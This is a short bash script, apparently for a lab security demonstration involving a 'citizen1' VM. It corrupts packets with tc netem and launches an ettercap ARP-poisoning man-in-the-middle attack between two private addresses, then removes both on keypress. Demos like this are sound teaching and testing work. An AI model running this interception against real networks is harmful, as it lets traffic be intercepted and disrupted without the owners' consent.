#!/bin/bash

sudo tc qdisc add dev eth0 root netem corrupt 10% 2>/dev/null
sudo ettercap -T -M arp /192.168.0.100// /192.168.0.10// &
ETTERCAP_PID=$!

read -p "MITM attack active. Run security_demo.sh on citizen1 VM, then press Enter to stop..."

sudo kill $ETTERCAP_PID 2>/dev/null
sudo tc qdisc del dev eth0 root 2>/dev/null